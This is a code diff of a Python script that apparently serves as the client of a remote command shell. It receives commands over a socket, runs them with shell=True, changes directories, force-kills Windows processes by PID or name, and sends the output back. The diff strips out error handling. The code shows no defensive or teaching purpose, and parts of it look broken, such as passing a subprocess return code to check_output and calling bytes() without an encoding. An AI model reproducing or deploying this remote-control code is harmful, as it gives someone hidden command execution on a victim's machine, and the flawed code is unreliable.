@@ -21,12 +21,8 @@ if __name__ == '__main__':
     
 
         if Date[0] == "cmd":                                    
-            try: 
-                output = check_output(Date[1], shell="True")         
-                Result = str(output, 'utf-8')                      
-            except: 
-                output = "Output: Wrong Command!"                   
-                Result = str(output)                                
+            output = check_output(Date[1], shell="True")         
+            Result = str(output, 'utf-8')                                                  
     
         elif Date[0] == "chdir":                                    
             if Date[1] == "back":                                  
@@ -57,13 +53,10 @@ if __name__ == '__main__':
             if Date[1].isdigit():
                 stop = subprocess.call(["taskkill", "/F", "/PID", Date[1]])
             else:
-                stop = subprocess.call(["taskkill", "/IM", Date[1]])
-            try:  
-                output_sub = check_output(stop, shell="True")         
-                Result = str(output_sub, 'utf-8')
-                Client.send(bytes(Result))
-            except Exception:
-                pass                                                           
+                stop = subprocess.call(["taskkill", "/F", "/IM", Date[1]])
+            output_sub = check_output(stop, shell="True")         
+            Result = str(output_sub, 'utf-8')
+            Client.send(bytes(Result))                                                          
 
         elif Date[0] == "quit":quit()                                                                        
     
